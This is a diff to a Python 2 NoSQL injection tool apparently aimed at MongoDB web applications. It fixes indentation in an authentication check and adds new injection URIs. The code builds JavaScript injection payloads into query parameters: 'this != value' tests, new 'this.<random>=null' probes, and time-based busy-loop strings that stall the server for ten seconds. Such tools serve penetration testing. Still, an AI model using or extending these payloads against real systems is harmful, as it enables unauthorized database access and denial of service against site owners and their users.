@@ -118,9 +118,9 @@ def netAttacks():
 
 		try:
 			conn = pymongo.MongoClient(uri)
-            print "MongoDB authenticated on " + target + ":27017!"
-            mgtOpen = True
-        except:
+			print "MongoDB authenticated on " + target + ":27017!"
+			mgtOpen = True
+		except:
 			print "something happened."
 			mainMenu()
 	
@@ -180,6 +180,7 @@ def webApps():
 	paramValue = []
 	vulnAddrs = []
 	possAddrs = []
+	testResults = []
 	appUp = False
 	strTbAttack = False
 	intTbAttack = False
@@ -547,6 +548,13 @@ def buildUri(origUri, randValue):
 	timeIntUri = split_uri[0] + "?"
 	strThisNeqUri = split_uri[0] + "?"
 	intThisNeqUri = split_uri[0] + "?"
+	strNullUri = split_uri[0] + "?"
+	intNullUri = split_uri[0] + "?"
+	
+	#Create a random 5 character collection name for null testing
+	chars = string.ascii_letters
+	fakeColl = ''.join(random.choice(chars) for x in range(5))
+	
 	x = 0
 
 	for item in paramName:
@@ -559,8 +567,10 @@ def buildUri(origUri, randValue):
 			whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
 			timeStrUri  += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
 			timeIntUri  += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
-			strThisNeqUri += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
-			intThisNeqUri += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
+			strThisNeqUri += paramName[x] + "=a'; return this." + fakeColl +  "!= '" + randValue + "'; var dummy='!" + "&"
+			intThisNeqUri += paramName[x] + "=1; return this." + fakeColl + "!=" + randValue + "; var dummy=1" + "&"
+			strNullUri += paramName[x] + "=a'; return this." + fakeColl + "=null; var dummy='!" + "&"
+			intNullUri += paramName[x] + "=1; return this." +fakeColl + "=null; var dummy=1" + "&"
 
 		else:
 			evilUri += paramName[x] + "=" + paramValue[x] + "&"
@@ -573,6 +583,8 @@ def buildUri(origUri, randValue):
 			timeIntUri += paramName[x] + "=" + paramValue[x] + "&"
 			strThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
 			intThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
+			strNullUri += paramName[x] + "=" + paramValue[x] + "&"
+			intNullUri += paramName[x] + "=" + paramValue[x] + "&"
 		x += 1
 
 	#Clip the extra & off the end of the URL
